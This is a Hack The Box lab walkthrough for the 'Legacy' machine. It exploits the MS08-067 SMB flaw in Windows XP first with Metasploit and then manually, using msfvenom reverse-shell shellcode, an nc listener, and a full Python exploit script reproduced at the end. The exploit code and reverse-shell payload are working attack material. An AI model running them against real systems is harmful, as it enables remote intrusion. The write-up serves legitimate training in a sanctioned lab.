
# HTB - Legacy

Legacy - 10.10.10.4

![](/images/legacy/1. legacy.png "Legacy Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Legacy is another early, easy machine from the Hack the Box platform.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

To root this machine we will use Metasploit to exploit a vulnerability in NetAPI32.dll through the Server Service and a specially crafted Remote Procedure Call, as documented in MS08-067.  This particular exploit achives remote code execution as NT/AUTHORITY SYSTEM (root) level privileges instantly.
After using Metasploit, we will also find a python script which exploits the same vulnerability, generate our own shellcode using msfvenom, and then run the python script for manual exploitation.

-1- nmap

-2- smbclient

-3- msfconsole

-4- msf module: auxiliary/scanner/smb/smb_version

-5- msf module: exploit/windows/smb/ms08_067_netapi

-6- python scripting

-7- msfvenom to generate shellcode for use in the python script

-8- nc -lvnp

<p>&nbsp;</p>

=======================================================

## Scanning and Enumeration

=======================================================

First off, we will start with a standard nmap command to see what initially shows as open:

    nmap -A -T4 10.10.10.4

![](/images/legacy/2. nmap.png "nmap")

So it looks like a Windows XP, possibly SP3 machine.

Ports 139, 445, and 3389 are open.  

Here are some further details from the scan:

![](/images/legacy/3. nmap.png "nmap")

Looks like we have some access via smb, port 139.  

We can try smbclient:  smbclient -NL 10.10.10.4

smbclient attempts to use smb to connect to port 139 by default

-N means no login info, anonymous login attempt

-L means list shares

10.10.10.4 is the IP address of the target

    smbclient -NL 10.10.10.4

![](/images/legacy/4. smbclient-1.png "smbclient")

No joy there. We can also try to force a certain level of the smb protocol by adding the option “--option='client min protocol=NT1'”

    smbclient --option='client min protocol=NT1' -NL 10.10.10.4

![](/images/legacy/5. smbclient-2.png "smbclient")

Still no luck, but we can also try Metasploit's smb_scanner:

    msfconsole

    use auxiliary/scanner/smb/smb_version

    show options

![](/images/legacy/6. msf smb_version.png "smb_scanner")

We must set the target via the RHOSTS (or rhosts, this is not case sensitive) variable. 

    set rhosts 10.10.10.4
    
    run

![](/images/legacy/7. msf smb_version_2.png "smb_scannner")

These scan results show it to be a Windows XP SP3 machine via port 445.

Next, let's see what Google results we can find:

![](/images/legacy/8. google_xp_smb_exploit.png "Google search")

The top two results mention MS08-067, so that is our first avenue we will explore.

The rapid7.com link will most likely contain details for a Metasploit module, so we can start there: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

![](/images/legacy/9. rapid7_ms08-067.png "Rapid7")

![](/images/legacy/10. rapid7_module_options.png "msf module options")

So, here we have the description of the exploit and the msf commands to run.  Let's move on to exploitation via Metasploit:


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

In your metasploit window, let's confirm the module is still present:

    search ms08-067

![](/images/legacy/11. msf_search.png "msf search")

Next we load the module:

    use exploit/windows/smb/ms08_067_netapi

Alternatively, if you searched for it you can reference by the # listed above: 

    use 0
    
First up, we want to see our options:

    show options

![](/images/legacy/12. msf_use.png "msf use")

Looks like we only need to set the RHOSTS setting and then run it:

    set rhosts 10.10.10.4

    run

![](/images/legacy/13. meterpreter.png "meterpreter")

And we have a meterpreter shell!

First two commands you should run anytime you have a meterpreter shell on a Windows machine:

    getuid

    sysinfo

![](/images/legacy/14. meterpreter_2.png "meterpreter")

NT AUTHORITY\SYSTEM means we have root level access to the machine

And the sysinfo output confirms this is Windows XP, SP3, 32-bit (x86)

Next you can upgrade to a shell to find the flags:

    shell

![](/images/legacy/15. shell.png "shell")

Flags are normally on the desktop of the various users. For Windows XP we need to go to Documents and Settings first:

    cd C:\"Documents and Settings"

![](/images/legacy/16. shell_2.png "shell")

We have users Administrator and john.  Let's get our flags:

    type john\Desktop\user.txt

    type Administrator\Desktop\root.txt

![](/images/legacy/17. flags.png "flags")

And we have our two flags.


<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================

To exploit manually we will need to download some code to run. The first place we look is on exploit-db.com, so let's re-run our Google search for that site specifically:

![](/images/legacy/18. google_ms08-067_exploit.png "Google")

The last link shown here is for a github.com repo. Since this exploit is so old, we will try the GitHub version first as these tend to be better maintained:
[https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

Click on the link then click the “Raw” button to view the raw code.  

![](/images/legacy/19. github_exploit.png "Github")

Copy/paste this raw code into a new python file on your Kali machine.  I'm using gedit and naming the file “smb-exploit.py”

![](/images/legacy/20. smb_exploit.py.png "smb_exploit.py")

Next scroll down until you see a commented section about shellcode:

![](/images/legacy/21. smb_exploit.py_2.png "smb_exploit.py")

So we need to generate our own shellcode and input it below. There are even sample commands for us to use in the comments.  

Since we ran meterpreter payload when exploiting via metasploit above, I am going to use a windows/shell_reverse_tcp payload this time.

My command to generate the shellcode is:  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

For an explanation of the options:

-p is for payload, in this case windows/shell_reverse_tcp

LHOST is our attacking machine where we are going to be listening for the reverse connection

LPORT is the port we want to receive the callback at, 443 in this case

EXITFUNC=thread is an option that provides additional stability in this case

-b is for “bad characters” or bytecode characters that our shellcode should not contain

-f is for format, ‘c’ in this case which would normally be for c code. even though we are using a python script in this case, all we are using is the shellcode. if you use “-f python” it will give you similar shellcode, but formatted differently. 

-a is for architecture, “x86” in this case for a 32-bit machine

--platform is for the type of machine, again in this case Windows

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

![](/images/legacy/22. msfveom_shellcode.png "shellcode")

Copy/paste the shellcode (highlighted in the red box above) into the python exploit. Remove the ‘;’ at the end.

![](/images/legacy/23. shellcode.png "shellcode")

I also edited the comment at the top of that screenshot to show my actual IP address and port used for the shellcode.

Save the python file and run it without any options.  If you have not done “chmod +x smb-exploit.py” yet, do so first.

![](/images/legacy/24. python_script_usage.png "python_script_usage")

So we see example usage here. Since we know this is Windows XP SP3 English from the metasploit scanner earlier, we can choose option 6.  

But before we run our exploit, we need to set up our nc listener in a separate terminal window:

    nc -lvnp 443

![](/images/legacy/25. nc_listener.png "nc listener")

Now back in the first terminal window, we can run the exploit:

    ./smb-exploit.py 10.10.10.4 6 445

![](/images/legacy/26. python_exploit.png "python exploit")

Once you see the ‘Exploit finish’ message, check over in your second terminal window and you should see:

![](/images/legacy/27. nc_connection.png "nc connection")

Here we have a shell on a Windows machine!  Since this is a Windows XP box, “whoami” is not likely to work, but the fact we are in the Windows\system32 directory likely means we are NT AUTHORITY\System, or “root”.  

As a best practice though, run the command “systeminfo” to see what type of machine we are on:

![](/images/legacy/28. systeminfo.png "systeminfo")

![](/images/legacy/29. systeminfo_2.png "systeminfo")

And then onward to collect our flags.  Same as before, change directory into “C:\Documents and Settings” and from there you can issue a single command for each flag file: root.txt and user.txt

![](/images/legacy/17. flags.png "flags")

Success!


<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

smb-exploit.py

    #!/usr/bin/env python
    import struct
    import time
    import sys
    from threading import Thread  # Thread is imported incase you would like to modify

    try:
        from impacket import smb
        from impacket import uuid
        #from impacket.dcerpc import dcerpc
        from impacket.dcerpc.v5 import transport

    except ImportError, _:
        print 'Install the following library to make this script work'
        print 'Impacket : https://github.com/CoreSecurity/impacket.git'
        print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
        sys.exit(1)

    print '#######################################################################'
    print '#   MS08-067 Exploit'
    print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
    print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
    print '#'
    print '#   Mod in 2018 by Andy Acer'
    print '#   - Added support for selecting a target port at the command line.'
    print '#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport'
    print '#   - Changed shellcode handling to allow for variable length shellcode.'
    print '#######################################################################\n'

    print ('''
    $   This version requires the Python Impacket library version to 0_9_17 or newer.
    $
    $   Here's how to upgrade if necessary:
    $
    $   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
    $   cd impacket
    $   pip install .
    
    ''')
    
    print '#######################################################################\n'
    
    
    # ------------------------------------------------------------------------
    # REPLACE THIS SHELLCODE with shellcode generated for your use
    # Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
    #
    # Example msfvenom commands to generate shellcode:
    # msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    
    # Reverse TCP to 10.10.14.24 port 443:
    shellcode=(
    "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
    "\x99\xf8\x8e\x94\x83\xee\xfc\xe2\xf4\x65\x10\x0c\x94\x99\xf8"
    "\xee\x1d\x7c\xc9\x4e\xf0\x12\xa8\xbe\x1f\xcb\xf4\x05\xc6\x8d"
    "\x73\xfc\xbc\x96\x4f\xc4\xb2\xa8\x07\x22\xa8\xf8\x84\x8c\xb8"
    "\xb9\x39\x41\x99\x98\x3f\x6c\x66\xcb\xaf\x05\xc6\x89\x73\xc4"
    "\xa8\x12\xb4\x9f\xec\x7a\xb0\x8f\x45\xc8\x73\xd7\xb4\x98\x2b"
    "\x05\xdd\x81\x1b\xb4\xdd\x12\xcc\x05\x95\x4f\xc9\x71\x38\x58"
    "\x37\x83\x95\x5e\xc0\x6e\xe1\x6f\xfb\xf3\x6c\xa2\x85\xaa\xe1"
    "\x7d\xa0\x05\xcc\xbd\xf9\x5d\xf2\x12\xf4\xc5\x1f\xc1\xe4\x8f"
    "\x47\x12\xfc\x05\x95\x49\x71\xca\xb0\xbd\xa3\xd5\xf5\xc0\xa2"
    "\xdf\x6b\x79\xa7\xd1\xce\x12\xea\x65\x19\xc4\x90\xbd\xa6\x99"
    "\xf8\xe6\xe3\xea\xca\xd1\xc0\xf1\xb4\xf9\xb2\x9e\x07\x5b\x2c"
    "\x09\xf9\x8e\x94\xb0\x3c\xda\xc4\xf1\xd1\x0e\xff\x99\x07\x5b"
    "\xc4\xc9\xa8\xde\xd4\xc9\xb8\xde\xfc\x73\xf7\x51\x74\x66\x2d"
    "\x19\xfe\x9c\x90\x84\x9e\x97\xe0\xe6\x96\x99\xf9\x35\x1d\x7f"
    "\x92\x9e\xc2\xce\x90\x17\x31\xed\x99\x71\x41\x1c\x38\xfa\x98"
    "\x66\xb6\x86\xe1\x75\x90\x7e\x21\x3b\xae\x71\x41\xf1\x9b\xe3"
    "\xf0\x99\x71\x6d\xc3\xce\xaf\xbf\x62\xf3\xea\xd7\xc2\x7b\x05"
    "\xe8\x53\xdd\xdc\xb2\x95\x98\x75\xca\xb0\x89\x3e\x8e\xd0\xcd"
    "\xa8\xd8\xc2\xcf\xbe\xd8\xda\xcf\xae\xdd\xc2\xf1\x81\x42\xab"
    "\x1f\x07\x5b\x1d\x79\xb6\xd8\xd2\x66\xc8\xe6\x9c\x1e\xe5\xee"
    "\x6b\x4c\x43\x6e\x89\xb3\xf2\xe6\x32\x0c\x45\x13\x6b\x4c\xc4"
    "\x88\xe8\x93\x78\x75\x74\xec\xfd\x35\xd3\x8a\x8a\xe1\xfe\x99"
    "\xab\x71\x41"
    )
    # ------------------------------------------------------------------------

    # Gotta make No-Ops (NOPS) + shellcode = 410 bytes
    num_nops = 410 - len(shellcode)
    newshellcode = "\x90" * num_nops
    newshellcode += shellcode  # Add NOPS to the front
    shellcode = newshellcode   # Switcheroo with the newshellcode temp variable
    
    #print "Shellcode length: %s\n\n" % len(shellcode)
    
    nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
        "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
    disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
        28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
    ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
    module_base = 0x6f880000


    def generate_rop(rvas):
        gadget1 = "\x90\x5a\x59\xc3"
        gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
        gadget3 = "\xcc\x90\xeb\x5a"
        ret = struct.pack('<L', 0x00018000)
        ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
        ret += struct.pack('<L', 0x01040110)
        ret += struct.pack('<L', 0x01010101)
        ret += struct.pack('<L', 0x01010101)
        ret += struct.pack('<L',
                           rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
        ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
        ret += gadget1
        ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
        ret += struct.pack('<L', rvas['jmp eax'] + module_base)
        ret += gadget2[0]
        ret += gadget2[1]
        ret += struct.pack('<L', rvas[
                           'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
        ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
        ret += gadget2[2]
        ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
        ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
        ret += struct.pack('<L', rvas['jmp eax'] + module_base)
        ret += gadget3
        return ret


    class SRVSVC_Exploit(Thread):
        def __init__(self, target, os, port=445):
           super(SRVSVC_Exploit, self).__init__()
    
           # MODIFIED HERE
           # Changed __port to port ... not sure if that does anything. I'm a newb.
           self.port = port
           self.target = target
           self.os = os
    
        def __DCEPacket(self):
            if (self.os == '1'):
                print 'Windows XP SP0/SP1 Universal\n'
                ret = "\x61\x13\x00\x01"
                jumper = nonxjmper % (ret, ret)
            elif (self.os == '2'):
                print 'Windows 2000 Universal\n'
                ret = "\xb0\x1c\x1f\x00"
                jumper = nonxjmper % (ret, ret)
            elif (self.os == '3'):
                print 'Windows 2003 SP0 Universal\n'
                ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
                jumper = nonxjmper % (ret, ret)
            elif (self.os == '4'):
                print 'Windows 2003 SP1 English\n'
                ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
                ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
                jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
                disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
                jumper = disableNXjumper % (
                    ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
            elif (self.os == '5'):
                print 'Windows XP SP3 French (NX)\n'
                ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
                disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
                # the nonxjmper also work in this case.
                jumper = nonxjmper % (disable_nx, ret)
            elif (self.os == '6'):
                print 'Windows XP SP3 English (NX)\n'
                ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
                disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
                # the nonxjmper also work in this case.
                jumper = nonxjmper % (disable_nx, ret)
            elif (self.os == '7'):
                print 'Windows XP SP3 English (AlwaysOn NX)\n'
                rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                    'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
                # the nonxjmper also work in this case.
                jumper = generate_rop(rvasets) + "AB"
            else:
                print 'Not supported OS version\n'
                sys.exit(-1)
    
            print '[-]Initiating connection'
    
            # MORE MODIFICATIONS HERE #############################################################################################
    
            if (self.port == '445'):
                self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
            else:
               # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
                # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
                #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.
    
                self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
            
            self.__trans.connect()
            print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
            self.__dce = self.__trans.DCERPC_class(self.__trans)
            self.__dce.bind(uuid.uuidtup_to_bin(
                ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
            path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
                "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
            server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
            prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
            
            # NEW HOTNESS
            # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
            #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
            #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
            #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
            MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
            Offset = "\x00\x00\x00\x00"
            ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620

            self.__stub = server + MaxCount + Offset + ActualCount + \
                path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        
    
            return
    
        def run(self):
            self.__DCEPacket()
            self.__dce.call(0x1f, self.__stub)
            time.sleep(3)
            print 'Exploit finish\n'
    
    if __name__ == '__main__':
           try:
               target = sys.argv[1]
               os = sys.argv[2]
               port = sys.argv[3]
           except IndexError:
                    print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
                    print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
                    print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
                    print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
                    print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
                    print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
                    print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
                    print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
                    print ''
                    print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:'
                    print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
                    print ''
                    sys.exit(-1)
        
    current = SRVSVC_Exploit(target, os, port)
    current.start()
    
<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. MITRE CVE list entry: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250)
2. Microsoft Security Bulletin entry: [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
3. Rapid7 Metasploit module: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)
4. Github Python-based exploit script: [https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>

